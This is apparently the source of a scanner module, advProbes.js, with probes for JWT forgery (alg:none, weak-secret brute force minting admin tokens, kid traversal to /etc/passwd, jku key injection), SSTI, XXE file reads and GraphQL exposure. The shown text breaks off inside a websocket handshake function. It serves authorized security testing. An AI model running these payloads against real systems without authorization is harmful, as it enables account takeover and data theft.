/**
 * advProbes.js — ADVANCED vulnerability-class detection probes (Wave-2, worker n6b).
 *
 * Same contract as httpProbes.js: REAL tools in the ToolRegistry, real HTTP
 * against the hunt's authorized target, NORMALIZED finding candidates
 * ({ type, severity, url, evidence, confidence, source, title }).
 *
 * Honesty rule (hard): a probe reports a finding ONLY when it OBSERVES
 * exploitable behavior in a real response — an accepted forged token, an
 * evaluated template expression, a callback hit proving an external entity
 * was fetched, an unauthenticated 101 upgrade, parallel requests all
 * succeeding past a stated limit, a high-entropy secret in a served bundle.
 * "The header exists" or "the endpoint exists" is NEVER a finding by itself.
 *
 * Safety: probes never execute for a target that failed policy/scope
 * validation — ToolExecutor enforces that BEFORE dispatching here. The
 * jku/x5u and XXE callback listeners bind 127.0.0.1 on ephemeral ports and
 * only prove a fetch when the TARGET actually connects back.
 */

import crypto from 'node:crypto';
import http from 'node:http';
import net from 'node:net';
import tls from 'node:tls';
import { probeMarker } from './httpProbes.js';

const DEFAULT_TIMEOUT_MS = 15_000;

async function fetchTimed(url, options = {}, timeoutMs = DEFAULT_TIMEOUT_MS) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
  const started = Date.now();
  try {
    const res = await fetch(url, { ...options, signal: ctrl.signal, redirect: 'manual' });
    const body = await res.text();
    return {
      status: res.status,
      headers: Object.fromEntries([...res.headers.entries()].map(([k, v]) => [k.toLowerCase(), v])),
      body,
      durationMs: Date.now() - started,
      url,
    };
  } finally {
    clearTimeout(timer);
  }
}

const sleep = ms => new Promise(r => setTimeout(r, ms));

function tryJson(text) {
  if (!text) return null;
  try {
    return JSON.parse(text);
  } catch {
    return null;
  }
}

function safePath(url) {
  try {
    const u = new URL(url);
    return u.pathname;
  } catch {
    return url;
  }
}

function snippetAround(body, needle, radius = 160) {
  const s = String(body);
  const i = s.indexOf(needle);
  if (i < 0) return s.slice(0, 400);
  return s.slice(Math.max(0, i - radius), i + needle.length + radius);
}

// ── JWT helpers ──────────────────────────────────────────────────────────

function b64urlJson(obj) {
  return Buffer.from(JSON.stringify(obj), 'utf8').toString('base64url');
}

function parseJwt(token) {
  const parts = String(token || '').split('.');
  if (parts.length < 2) return null;
  try {
    const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString('utf8'));
    const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString('utf8'));
    return { header, payload, signature: parts[2] || '' };
  } catch {
    return null;
  }
}

function signHs256(header, payload, secret) {
  const h = b64urlJson(header);
  const p = b64urlJson(payload);
  const sig = crypto.createHmac('sha256', secret).update(`${h}.${p}`).digest('base64url');
  return `${h}.${p}.${sig}`;
}

/** Small, honest weak-secret list — real-world top offenders, no 10k-wordlist spray. */
const WEAK_SECRETS = [
  'secret',
  'password',
  '123456',
  '12345678',
  'qwerty',
  'admin',
  'letmein',
  'changeme',
  'jwtsecret',
  'jwt_secret',
  'mysecret',
  'supersecret',
  'topsecret',
  'token',
  'access',
  'auth',
  'login',
  'test',
  'testing',
  'dev',
  'development',
  'prod',
  'production',
  'key',
  'apikey',
  'api_key',
  'privatekey',
  'private_key',
  'your-256-bit-secret',
  'your_256_bit_secret',
  'secretkey',
  'secret_key',
  's3cr3t',
  'p@ssw0rd',
  'Passw0rd',
  'Password1',
  'hello',
  'welcome',
  'abc123',
  'football',
  'monkey',
  'dragon',
  'master',
  'sunshine',
  'princess',
  'trustno1',
];

function extractTokenFromResponse(res) {
  const j = tryJson(res.body);
  if (j && typeof j === 'object') {
    for (const k of ['token', 'accessToken', 'access_token', 'idToken', 'id_token', 'jwt']) {
      if (typeof j[k] === 'string' && j[k].split('.').length >= 2)
        return { token: j[k], via: `json:${k}` };
    }
    if (j.data && typeof j.data === 'object') {
      for (const k of ['token', 'accessToken', 'access_token']) {
        if (typeof j.data[k] === 'string' && j.data[k].split('.').length >= 2)
          return { token: j.data[k], via: `json:data.${k}` };
      }
    }
  }
  const setCookie = res.headers['set-cookie'] || '';
  const m = /(?:^|;\s*)(jwt|token|access_token|auth_token)=([^;\s]+)/i.exec(setCookie);
  if (m && m[2].split('.').length >= 2) return { token: m[2], via: `cookie:${m[1]}` };
  return null;
}

/** Ephemeral 127.0.0.1 listener proving the TARGET fetched an attacker URL. */
async function startCallbackListener(tag) {
  const hits = [];
  const server = http.createServer((req, res) => {
    let body = '';
    req.on('data', c => {
      body += c;
    });
    req.on('end', () => {
      hits.push({
        tag,
        method: req.method,
        url: req.url,
        ua: req.headers['user-agent'] || '',
        at: Date.now(),
      });
      if (/\.json|jwks/i.test(req.url || '')) {
        res.setHeader('content-type', 'application/json');
        res.end(JSON.stringify({ keys: server._jwk ? [server._jwk] : [] }));
      } else {
        res.setHeader('content-type', 'application/x-pem-file');
        res.end(server._pem || '');
      }
    });
  });
  await new Promise(r => server.listen(0, '127.0.0.1', r));
  const port = server.address().port;
  return {
    server,
    hits,
    url: `http://127.0.0.1:${port}`,
    close: () => new Promise(r => server.close(r)),
  };
}

/** A protected endpoint is usable for JWT mutation tests only if it
 *  rejects anonymous traffic and accepts the real token. */
async function findProtectedEndpoint(origin, candidates, token, timeoutMs) {
  const baseline = {};
  for (const p of candidates) {
    const url = `${origin}${p}`;
    const anon = await fetchTimed(url, {}, timeoutMs).catch(e => ({ error: e.message }));
    const authed = await fetchTimed(
      url,
      { headers: { authorization: `Bearer ${token}` } },
      timeoutMs
    ).catch(e => ({ error: e.message }));
    const anonRes = { status: anon.status ?? null, body: anon.body || '' };
    baseline[url] = anonRes;
    if (!anon.error && !authed.error && [401, 403].includes(anon.status) && authed.status === 200) {
      return { url, baseline: anonRes, authedBody: authed.body || '' };
    }
  }
  // Fallback: any endpoint where the token gets a 200 while anonymous does not.
  for (const p of candidates) {
    const url = `${origin}${p}`;
    const anon = baseline[url];
    const authed = await fetchTimed(
      url,
      { headers: { authorization: `Bearer ${token}` } },
      timeoutMs
    ).catch(e => ({ error: e.message }));
    if (!authed.error && authed.status === 200 && anon && anon.body !== (authed.body || '')) {
      return { url, baseline: anon, authedBody: authed.body || '' };
    }
  }
  return null;
}

/** "Accepted" = 2xx AND body differs from the anonymous baseline (rules out public 200s). */
function isAccepted(res, baseline) {
  if (res.error || !(res.status >= 200 && res.status < 300)) return false;
  return (res.body || '') !== (baseline.body || '');
}

// ── Tool: jwt_attack_probe ───────────────────────────────────────────────

export async function jwtProbe({
  baseUrl,
  token = null,
  loginPath = '/api/login',
  loginBody = null,
  protectedPaths = null,
  timeoutMs = DEFAULT_TIMEOUT_MS,
} = {}) {
  const started = Date.now();
  const origin = baseUrl.replace(/\/$/, '');
  const checks = [];
  const findings = [];

  // 1. Obtain a token if the caller didn't supply one.
  let tok = token;
  let tokenVia = token ? 'caller-supplied' : null;
  if (!tok) {
    const bodies = [
      loginBody,
      { username: 'test', password: 'test' },
      { email: 'test@example.com', password: 'test' },
    ].filter(Boolean);
    for (const b of bodies) {
      const res = await fetchTimed(
        `${origin}${loginPath}`,
        {
          method: 'POST',
          headers: { 'content-type': 'application/json' },
          body: JSON.stringify(b),
        },
        timeoutMs
      ).catch(e => ({ error: e.message }));
      const found = !res.error ? extractTokenFromResponse(res) : null;
      checks.push({
        test: 'token-acquire',
        loginPath,
        status: res.status ?? null,
        found: !!found,
        error: res.error || null,
      });
      if (found) {
        tok = found.token;
        tokenVia = found.via;
        break;
      }
    }
    if (!tok) {
      return {
        tool: 'jwt_attack_probe',
        baseUrl,
        checks,
        findings,
        note: 'No JWT obtainable from the login endpoint — supply `token` to run the attack tests.',
        durationMs: Date.now() - started,
      };
    }
  }

  const parsed = parseJwt(tok);
  if (!parsed) {
    checks.push({ test: 'token-parse', error: 'not a JWT (expected header.payload[.signature])' });
    return {
      tool: 'jwt_attack_probe',
      baseUrl,
      checks,
      findings,
      durationMs: Date.now() - started,
    };
  }
  checks.push({
    test: 'token-parse',
    alg: parsed.header.alg || '(none)',
    kid: parsed.header.kid || null,
    via: tokenVia,
  });

  const candidates = protectedPaths || [
    '/api/me',
    '/api/profile',
    '/api/user',
    '/me',
    '/api/account',
    '/api/users/me',
  ];
  const prot = await findProtectedEndpoint(origin, candidates, tok, timeoutMs);
  if (!prot) {
    checks.push({ test: 'protected-endpoint', found: false, tried: candidates });
    return {
      tool: 'jwt_attack_probe',
      baseUrl,
      checks,
      findings,
      note: 'No endpoint both rejected anonymous traffic and accepted the token — mutation tests need one.',
      durationMs: Date.now() - started,
    };
  }
  checks.push({ test: 'protected-endpoint', found: true, url: prot.url });

  const sendAs = t =>
    fetchTimed(prot.url, { headers: { authorization: `Bearer ${t}` } }, timeoutMs).catch(e => ({
      error: e.message,
    }));

  // 2. alg:none — strip the signature entirely.
  const noneTok = `${b64urlJson({ alg: 'none', typ: 'JWT' })}.${b64urlJson(parsed.payload)}.`;
  const noneRes = await sendAs(noneTok);
  checks.push({
    test: 'none-alg',
    status: noneRes.status ?? null,
    accepted: isAccepted(noneRes, prot.baseline),
  });
  if (isAccepted(noneRes, prot.baseline)) {
    findings.push({
      type: 'jwt-none-alg',
      title: `JWT 'none' algorithm accepted at ${safePath(prot.url)} — signature check bypassed`,
      severity: 'critical',
      url: prot.url,
      evidence: {
        request: `GET ${safePath(prot.url)} with Authorization: Bearer <alg:none, empty signature>`,
        responseStatus: noneRes.status,
        responseSnippet: String(noneRes.body || '').slice(0, 500),
        note: 'The server accepted an unsigned token: anyone can forge arbitrary claims (e.g. role=admin).',
      },
      confidence: 0.95,
      source: 'jwt_attack_probe',
    });
  }

  // 3. Weak-secret brute force — re-sign a PRIVILEGE-ESCALATED payload per secret.
  const tampered = { ...parsed.payload, role: 'admin', isAdmin: true, sub: 'admin' };
  let cracked = null;
  for (const s of WEAK_SECRETS) {
    const forged = signHs256({ alg: 'HS256', typ: 'JWT' }, tampered, s);
    const r = await sendAs(forged);
    if (isAccepted(r, prot.baseline)) {
      cracked = { secret: s, response: r };
      break;
    }
  }
  checks.push({ test: 'weak-secret', tried: WEAK_SECRETS.length, cracked: !!cracked });
  if (cracked) {
    findings.push({
      type: 'jwt-weak-secret',
      title: `JWT signed with guessable HMAC secret '${cracked.secret}' — forged admin token accepted`,
      severity: 'critical',
      url: prot.url,
      evidence: {
        request: `GET ${safePath(prot.url)} with Authorization: Bearer <HS256, role=admin, signed with '${cracked.secret}'>`,
        secret: cracked.secret,
        responseStatus: cracked.response.status,
        responseSnippet: String(cracked.response.body || '').slice(0, 500),
        note: 'The HMAC secret is in a trivial guess list; an attacker can mint tokens with any claims.',
      },
      confidence: 0.95,
      source: 'jwt_attack_probe',
    });
  }

  // 4. kid path traversal — evidence ONLY: server error proving kid is used as a file path.
  const kids = ['../../../../../../etc/passwd', '..\\..\\..\\windows\\win.ini', '/etc/passwd'];
  for (const kid of kids) {
    const variants = [
      { alg: 'none', typ: 'JWT', kid }, // unsigned + traversal
      { ...parsed.header, kid }, // original sig + traversal
    ];
    for (const h of variants) {
      const t =
        h.alg === 'none'
          ? `${b64urlJson(h)}.${b64urlJson(parsed.payload)}.`
          : `${b64urlJson(h)}.${b64urlJson(parsed.payload)}.${parsed.signature}`;
      const r = await sendAs(t);
      const body = String(r.body || '');
      const leaksPath =
        /ENOENT|no such file|open\(|readFile|include_path|failed to open/i.test(body) &&
        (body.includes(kid.replace(/\\/g, '/').split('/').pop()) || /passwd|win\.ini/i.test(body));
      checks.push({
        test: 'kid-traversal',
        kid,
        alg: h.alg,
        status: r.status ?? null,
        pathLeak: leaksPath,
      });
      if (leaksPath) {
        findings.push({
          type: 'jwt-kid-traversal',
          title: `JWT 'kid' header treated as a filesystem path at ${safePath(prot.url)}`,
          severity: 'high',
          url: prot.url,
          evidence: {
            request: `GET ${safePath(prot.url)} with JWT header kid="${kid}"`,
            responseStatus: r.status,
            responseSnippet: body.slice(0, 600),
            note: 'The error proves the kid value is resolved as a key file path — path traversal / LFI in key loading.',
          },
          confidence: 0.9,
          source: 'jwt_attack_probe',
        });
        break;
      }
    }
    if (findings.some(f => f.type === 'jwt-kid-traversal')) break;
  }

  // 5. jku / x5u header injection — needs the TARGET to fetch our key URL back.
  //    Listener binds 127.0.0.1: works for local hunts; remote targets can't
  //    reach it, so no finding is reported unless the fetch is OBSERVED.
  const rsa = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
  const pubJwk = rsa.publicKey.export({ format: 'jwk' });
  pubJwk.kid = 'dm-attacker-key';
  const cb = await startCallbackListener('jwt-jku');
  cb.server._jwk = pubJwk;
  try {
    const jkuUrl = `${cb.url}/jwks.json`;
    const jkuHeader = { alg: 'RS256', typ: 'JWT', jku: jkuUrl, kid: 'dm-attacker-key' };
    const h = b64urlJson(jkuHeader);
    const p = b64urlJson(tampered);
    const sig = crypto
      .sign('sha256', Buffer.from(`${h}.${p}`), rsa.privateKey)
      .toString('base64url');
    const jkuTok = `${h}.${p}.${sig}`;
    const r = await sendAs(jkuTok);
    await sleep(1500); // give the target time to fetch the JWKS
    const fetched = cb.hits.length > 0;
    const acceptedJku = isAccepted(r, prot.baseline);
    checks.push({
      test: 'jku-injection',
      jku: jkuUrl,
      serverFetchedKey: fetched,
      tokenAccepted: acceptedJku,
      status: r.status ?? null,
    });
    if (fetched) {
      findings.push({
        type: 'jwt-jku-key-fetch',
        title: `JWT 'jku' header made the server fetch an attacker-controlled JWKS`,
        severity: 'high',
        url: prot.url,
        evidence: {
          request: `GET ${safePath(prot.url)} with JWT header jku="${jkuUrl}"`,
          callbackHit: cb.hits[0],
          tokenAccepted: acceptedJku,
          note: 'The server performed a server-side request to the attacker URL to load verification keys (key confusion / SSRF).',
        },
        confidence: 0.95,
        source: 'jwt_attack_probe',
      });
      if (acceptedJku) {
        findings.push({
          type: 'jwt-jku-trusted',
          title: `JWT signed by an ATTACKER key accepted via 'jku' trust at ${safePath(prot.url)}`,
          severity: 'critical',
          url: prot.url,
          evidence: {
            request: `GET ${safePath(prot.url)} with Authorization: Bearer <RS256, jku=${jkuUrl}, role=admin>`,
            responseStatus: r.status,
            responseSnippet: String(r.body || '').slice(0, 500),
            note: 'Full signature bypass: the server trusts keys from the URL named in the token header.',
          },
          confidence: 0.98,
          source: 'jwt_attack_probe',
        });
      }
    }
  } finally {
    await cb.close();
  }

  return { tool: 'jwt_attack_probe', baseUrl, checks, findings, durationMs: Date.now() - started };
}

// ── Tool: ssti_probe — server-side template injection ────────────────────
// Math-evaluation oracles: {{a*b}} etc. A finding needs the COMPUTED value
// in the response with the RAW payload absent (evaluated, not reflected).

function sstiPayloads(a, b) {
  return [
    { engine: 'Jinja2/Twig ({{ }})', payload: `{{${a}*${b}}}` },
    { engine: 'FreeMarker/Velocity (${ })', payload: `\${${a}*${b}}` },
    { engine: 'FreeMarker/Pug (#{ })', payload: `#\{${a}*${b}}` },
    { engine: 'ERB/EJS (<%= %>)', payload: `<%= ${a}*${b} %>` },
    { engine: 'Thymeleaf ([[${ ]]])', payload: `[[${'${'}${a}*${b}}]]` },
    { engine: 'Smarty ({ })', payload: `{${a}*${b}}` },
  ];
}

const SSTI_ENGINE_FINGERPRINTS =
  /jinja2|twig|freemarker|velocity|smarty|mustache|handlebars|\berb\b|thymeleaf|djangotemplate|tornado\.template/i;

export async function sstiProbe({
  baseUrl,
  webProbe: recon = null,
  endpoints = null,
  timeoutMs = DEFAULT_TIMEOUT_MS,
} = {}) {
  const started = Date.now();
  const origin = baseUrl.replace(/\/$/, '');
  const checks = [];
  const findings = [];
  const seen = new Set();

  // Injection points: recon query params + POST forms, plus common conventions.
  const targets = []; // {method, url, param}
  const addTarget = (method, url, param) => {
    const k = `${method} ${url} ${param}`;
    if (!seen.has(k)) {
      seen.add(k);
      targets.push({ method, url, param });
    }
  };
  if (recon) {
    for (const qp of recon.queryParams || []) {
      for (const p of qp.params) addTarget('GET', `${origin}${qp.path}`, p);
    }
    for (const f of recon.forms || []) {
      const name = f.inputs.find(i => i.name)?.name;
      if (name) addTarget(f.method === 'post' ? 'POST' : 'GET', f.action, name);
    }
  }
  if (endpoints) for (const e of endpoints) addTarget('GET', `${origin}${e}`, 'q');
  for (const e of ['/greet', '/hello', '/render', '/preview', '/search']) {
    addTarget(
      'GET',
      `${origin}${e}`,
      e === '/render' ? 'template' : e === '/preview' ? 'text' : 'name'
    );
  }

  const a = 10000 + Math.floor(Math.random() * 89999);
  const b = 3 + Math.floor(Math.random() * 90);
  const expected = String(a * b);

  const sendPayload = async (t, payload) => {
    try {
      if (t.method === 'POST') {
        const body = {};
        body[t.param] = payload;
        return await fetchTimed(
          t.url,
          {
            method: 'POST',
            headers: { 'content-type': 'application/x-www-form-urlencoded' },
            body: new URLSearchParams(body).toString(),
          },
          timeoutMs
        );
      }
      const u = new URL(t.url, origin);
      u.searchParams.set(t.param, payload);
      return await fetchTimed(u.toString(), {}, timeoutMs);
    } catch (e) {
      return { error: e.message };
    }
  };

  for (const t of targets.slice(0, 14)) {
    for (const { engine, payload } of sstiPayloads(a, b)) {
      const res = await sendPayload(t, payload);
      if (res.error || typeof res.body !== 'string') {
        checks.push({
          target: `${t.method} ${safePath(t.url)} [${t.param}]`,
          engine,
          error: res.error || 'no body',
        });
        continue;
      }
      const evaluated =
        res.body.includes(expected) &&
        !res.body.includes(payload) &&
        !res.body.includes(`${a}*${b}`);
      checks.push({
        target: `${t.method} ${safePath(t.url)} [${t.param}]`,
        engine,
        status: res.status,
        evaluated,
      });
      if (evaluated) {
        findings.push({
          type: 'ssti',
          title: `Server-side template injection (${engine}) in ${t.method} ${safePath(t.url)} parameter '${t.param}'`,
          severity: 'high',
          url: t.url,
          evidence: {
            request: `${t.method} ${safePath(t.url)} ${t.param}=${payload}`,
            engine,
            expectedValue: expected,
            responseSnippet: snippetAround(res.body, expected),
            note: 'The template expression was EVALUATED server-side (computed value returned, raw payload absent) — SSTI, often RCE.',
          },
          confidence: 0.93,
          source: 'ssti_probe',
        });
        break; // one engine hit per injection point is enough
      }
    }
    if (findings.some(f => f.url === t.url)) break;
  }

  // Engine fingerprint via a lone "{{" — error pages naming the engine.
  if (!findings.length && targets.length) {
    const t = targets[0];
    const res = await sendPayload(t, '{{');
    if (!res.error && typeof res.body === 'string' && SSTI_ENGINE_FINGERPRINTS.test(res.body)) {
      const eng = (SSTI_ENGINE_FINGERPRINTS.exec(res.body) || [])[0];
      checks.push({ test: 'engine-fingerprint', engine: eng, status: res.status });
      findings.push({
        type: 'ssti-engine-disclosure',
        title: `Template engine '${eng}' disclosed in error output at ${safePath(t.url)}`,
        severity: 'low',
        url: t.url,
        evidence: {
          request: `${t.method} ${safePath(t.url)} ${t.param}={{`,
          engine: eng,
          responseSnippet: snippetAround(res.body, eng),
          note: 'Error output names the template engine — narrows SSTI payload crafting for an attacker.',
        },
        confidence: 0.8,
        source: 'ssti_probe',
      });
    }
  }

  return { tool: 'ssti_probe', baseUrl, checks, findings, durationMs: Date.now() - started };
}

// ── Tool: xxe_probe — XML external entity injection ──────────────────────
// Findings ONLY on observed behavior: (1) our callback listener is hit
// (server resolved the external entity → SSRF), (2) file:/// content or an
// explicit file-read error is returned.

export async function xxeProbe({
  baseUrl,
  endpoints = null,
  webProbe: recon = null,
  timeoutMs = DEFAULT_TIMEOUT_MS,
} = {}) {
  const started = Date.now();
  const origin = baseUrl.replace(/\/$/, '');
  const checks = [];
  const findings = [];

  const candidates = [];
  if (endpoints) candidates.push(...endpoints);
  if (recon) {
    for (const ep of recon.endpoints || []) {
      if (/xml|soap|parse|upload|import|feed/i.test(ep)) candidates.push(ep);
    }
  }
  candidates.push('/api/xml', '/xml', '/soap', '/api/parse', '/api/upload');

  const cb = await startCallbackListener('xxe');
  try {
    for (const ep of [...new Set(candidates)].slice(0, 6)) {
      const url = `${origin}${ep.startsWith('/') ? ep : '/' + ep}`;
      // Per-endpoint marker: a callback hit is attributed to THIS request only.
      const marker = `${probeMarker('xxe')}${ep.replace(/[^a-z0-9]/gi, '')}`;
      const cbEntityUrl = `${cb.url}/entity?m=${marker}`;
      const ssrfXml = `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "${cbEntityUrl}">]>\n<r><data>&xxe;</data></r>`;
      const fileXml = `<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<r><data>&xxe;</data></r>`;
      const payloads = [
        ['ssrf', ssrfXml, 'application/xml'],
        ['ssrf-text', ssrfXml, 'text/xml'],
        ['file', fileXml, 'application/xml'],
      ];
      for (const [label, xml, ctype] of payloads) {
        const hitsBefore = cb.hits.length;
        const res = await fetchTimed(
          url,
          {
            method: 'POST',
            headers: { 'content-type': ctype },
            body: xml,
          },
          timeoutMs
        ).catch(e => ({ error: e.message }));
        const check = {
          endpoint: ep,
          payload: label,
          contentType: ctype,
          status: res.status ?? null,
          error: res.error || null,
        };
        if (!res.error && typeof res.body === 'string') {
          const body = res.body;
          if (label.startsWith('ssrf')) {
            await sleep(1200);
            // HONESTY: only hits caused by THIS request (marker match) count —
            // a fetch from an earlier endpoint must not implicate this one.
            const fresh = cb.hits
              .slice(hitsBefore)
              .filter(h => String(h.url || '').includes(marker));
            check.callbackHit = fresh.length > 0;
            // One finding per endpoint: the first proving content-type wins.
            if (
              fresh.length > 0 &&
              !findings.some(f => f.url === url && f.type === 'xxe-external-entity')
            ) {
              check.callbackHitDetail = fresh[0];
              findings.push({
                type: 'xxe-external-entity',
                title: `XXE: external entity resolved server-side at POST ${ep} (SSRF)`,
                severity: 'high',
                url,
                evidence: {
                  request: `POST ${ep} Content-Type: ${ctype} with <!ENTITY xxe SYSTEM "${cbEntityUrl}">`,
                  callbackHit: fresh[0],
                  responseStatus: res.status,
                  note: 'The server fetched our external-entity URL — it resolves attacker-controlled entities (SSRF, pivoting).',
                },
                confidence: 0.95,
                source: 'xxe_probe',
              });
            }
          }
          if (label === 'file') {
            const fileDisclosed = /root:.*:0:0|daemon:.*:[0-9]+:[0-9]+/i.test(body);
            const fileError =
              /FileNotFoundException|fopen\(|failed to open stream.*passwd|java\.io.*passwd/i.test(
                body
              );
            check.fileDisclosed = fileDisclosed;
            check.fileError = fileError;
            if (fileDisclosed) {
              findings.push({
                type: 'xxe-file-disclosure',
                title: `XXE: local file disclosure (/etc/passwd) via POST ${ep}`,
                severity: 'critical',
                url,
                evidence: {
                  request: `POST ${ep} with <!ENTITY xxe SYSTEM "file:///etc/passwd">`,
                  responseSnippet: body.slice(0, 600),
                  note: 'Contents of /etc/passwd were returned — arbitrary local file read via XXE.',
                },
                confidence: 0.97,
                source: 'xxe_probe',
              });
            } else if (fileError) {
              findings.push({
                type: 'xxe-file-access-attempt',
                title: `XXE: server attempted local file access via POST ${ep}`,
                severity: 'medium',
                url,
                evidence: {
                  request: `POST ${ep} with <!ENTITY xxe SYSTEM "file:///etc/passwd">`,
                  responseSnippet: body.slice(0, 600),
                  note: 'The error proves the parser tried to open the local file — file-read primitive exists even though content was not returned.',
                },
                confidence: 0.85,
                source: 'xxe_probe',
              });
            }
          }
        }
        checks.push(check);
      }
      const kinds = new Set(findings.map(f => f.type));
      if (
        kinds.has('xxe-external-entity') &&
        (kinds.has('xxe-file-disclosure') || kinds.has('xxe-file-access-attempt'))
      )
        break;
    }
  } finally {
    await cb.close();
  }

  return { tool: 'xxe_probe', baseUrl, checks, findings, durationMs: Date.now() - started };
}

// ── Tool: graphql_probe ──────────────────────────────────────────────────
// Introspection / field-suggestion / batching / GET-queries — every finding
// is grounded in the actual GraphQL response shape.

const GQL_PATHS = ['/graphql', '/api/graphql', '/graphiql', '/api/graphiql', '/gql', '/api/gql'];

async function gqlPost(url, body, timeoutMs) {
  return fetchTimed(
    url,
    {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify(body),
    },
    timeoutMs
  ).catch(e => ({ error: e.message }));
}

function isGraphqlResponse(res) {
  if (res.error || typeof res.body !== 'string') return false;
  const j = tryJson(res.body);
  if (!j) return false;
  if (Array.isArray(j)) return j.every(e => e && (e.data !== undefined || e.errors !== undefined));
  return j.data !== undefined || j.errors !== undefined;
}

export async function graphqlProbe({ baseUrl, paths = null, timeoutMs = DEFAULT_TIMEOUT_MS } = {}) {
  const started = Date.now();
  const origin = baseUrl.replace(/\/$/, '');
  const checks = [];
  const findings = [];

  const candidates = [];
  if (paths) candidates.push(...paths);
  candidates.push(...GQL_PATHS);

  for (const p of [...new Set(candidates)].slice(0, 6)) {
    const url = `${origin}${p.startsWith('/') ? p : '/' + p}`;

    // 0. Detect a GraphQL endpoint at all.
    const detect = await gqlPost(url, { query: '{__typename}' }, timeoutMs);
    if (!isGraphqlResponse(detect)) {
      checks.push({ path: p, graphql: false, status: detect.status ?? null });
      continue;
    }
    checks.push({ path: p, graphql: true, status: detect.status });
    const ep = { url, path: p };

    // 1. Introspection enabled?
    const intro = await gqlPost(url, { query: '{__schema{queryType{name}}}' }, timeoutMs);
    const ij = tryJson(intro.body);
    if (ij && ij.data && ij.data.__schema) {
      checks.push({ ...ep, test: 'introspection', enabled: true });
      findings.push({
        type: 'graphql-introspection',
        title: `GraphQL introspection enabled at ${p} — full schema exposed`,
        severity: 'medium',
        url,
        evidence: {
          request: `POST ${p} {"query":"{__schema{queryType{name}}}"}`,
          responseSnippet: String(intro.body || '').slice(0, 600),
          note: 'Introspection returns the entire schema — attackers enumerate every type, field, and mutation.',
        },
        confidence: 0.95,
        source: 'graphql_probe',
      });
    } else {
      checks.push({ ...ep, test: 'introspection', enabled: false });
    }

    // 2. Field suggestions leak schema details?
    const badField = `zzzNoSuchField${Date.now().toString(36)}`;
    const sug = await gqlPost(url, { query: `{${badField}}` }, timeoutMs);
    const sj = tryJson(sug.body);
    const sugMsg =
      sj && Array.isArray(sj.errors) ? sj.errors.map(e => e.message || '').join(' ') : '';
    const suggests = /did you mean|suggestion|did you forget/i.test(sugMsg) && /".*"/.test(sugMsg);
    checks.push({ ...ep, test: 'field-suggestion', suggests, status: sug.status ?? null });
    if (suggests) {
      findings.push({
        type: 'graphql-field-suggestion',
        title: `GraphQL field suggestions at ${p} leak valid schema names`,
        severity: 'low',
        url,
        evidence: {
          request: `POST ${p} {"query":"{${badField}}"}`,
          suggestion: sugMsg.slice(0, 300),
          responseSnippet: String(sug.body || '').slice(0, 600),
          note: 'Error messages suggest valid field names — schema enumeration without introspection.',
        },
        confidence: 0.85,
        source: 'graphql_probe',
      });
    }

    // 3. Query batching?
    const batch = await gqlPost(
      url,
      Array.from({ length: 5 }, () => ({ query: '{__typename}' })),
      timeoutMs
    );
    const bj = tryJson(batch.body);
    const batched =
      Array.isArray(bj) &&
      bj.length === 5 &&
      bj.every(e => e && (e.data !== undefined || e.errors !== undefined));
    checks.push({ ...ep, test: 'batching', enabled: batched, status: batch.status ?? null });
    if (batched) {
      findings.push({
        type: 'graphql-batching',
        title: `GraphQL query batching enabled at ${p} — brute-force / DoS amplification`,
        severity: 'medium',
        url,
        evidence: {
          request: `POST ${p} [5 × {"query":"{__typename}"}]`,
          responseSnippet: String(batch.body || '').slice(0, 600),
          note: 'The server executed all 5 batched queries in one request — enables credential-stuffing and query-complexity DoS.',
        },
        confidence: 0.9,
        source: 'graphql_probe',
      });
    }

    // 4. GET-based queries (CSRF-able)?
    const getQ = await fetchTimed(
      `${url}?query=${encodeURIComponent('{__typename}')}`,
      {},
      timeoutMs
    ).catch(e => ({ error: e.message }));
    const getWorks = isGraphqlResponse(getQ);
    checks.push({ ...ep, test: 'get-queries', works: getWorks, status: getQ.status ?? null });
    if (getWorks) {
      findings.push({
        type: 'graphql-get-queries',
        title: `GraphQL at ${p} answers queries over GET — CSRF risk`,
        severity: 'low',
        url,
        evidence: {
          request: `GET ${p}?query={__typename}`,
          responseSnippet: String(getQ.body || '').slice(0, 400),
          note: 'Queries reachable via GET can be triggered cross-site (CSRF) when auth is cookie-based.',
        },
        confidence: 0.85,
        source: 'graphql_probe',
      });
    }

    break; // first live GraphQL endpoint fully tested
  }

  return { tool: 'graphql_probe', baseUrl, checks, findings, durationMs: Date.now() - started };
}
// ── Tool: websocket_probe ──────────────────────────────────────────────
// Raw-socket upgrade handshake (no deps): tests Origin validation and
// unauthenticated access. A finding needs an actual 101 to a forged Origin
// or with no credentials — never just "a /ws path exists".

const WS_PATHS = [
  '/ws',
  '/websocket',
  '/socket',
  '/cable',
  '/realtime',
  '/ws/chat',
  '/socket.io/?EIO=4&transport=websocket',
];

function wsHandshake(targetUrl, { origin = undefined, extraHeaders = {}, timeoutMs = 8000 } = {}) {
  const u = new URL(targetUrl);
  const isTls = u.protocol === 'https:' || u.protocol === 'wss:';
  const port = Number(u.port) || (isTls ? 443 : 80);
  const key = crypto.randomBytes(16).toString('base64');
  return new Promise(resolve => {
    let done = false;
    const finish = r => {
      if (!done) {
        done = true;
        try {
          sock.destroy();
        } catch {}
        resolve(r);
      }
    };
    let sock;
    const timer = setTimeout(() => finish({ ok: false, error: 'timeout' }), timeoutMs);
    const lines = () =>
      [
        `GET ${u.pathname}${u.search} HTTP/1.1`,
        `Host: ${u.hostname}`,
        'Upgrade: websocket',
        'Connection: Upgrade',
        `Sec-WebSocket-Key: ${key}`,
        'Sec-WebSocket-Version: 13',
        ...(origin !== undefined ? [`Origin: ${origin}`] : []),
        ...Object.entries(extraHeaders).map(([k, v]) => `${k}: ${v}`),
        '',
        '',
      ].join('\r\n');
    let wrote = false;
    const writeReq = () => {
      if (!wrote) {
        wrote = true;
        sock.write(lines());
      }
    };
    try {
      sock = isTls
        ? tls.connect({ host: u.hostname, port, servername: u.hostname, rejectUnauthorized: false })
        : net.connect({ host: u.hostname, port });
    } catch (e) {
      clearTimeout(timer);
      return finish({ ok: false, error: String(e.message || e) });
    }
    sock.on('connect', writeReq);
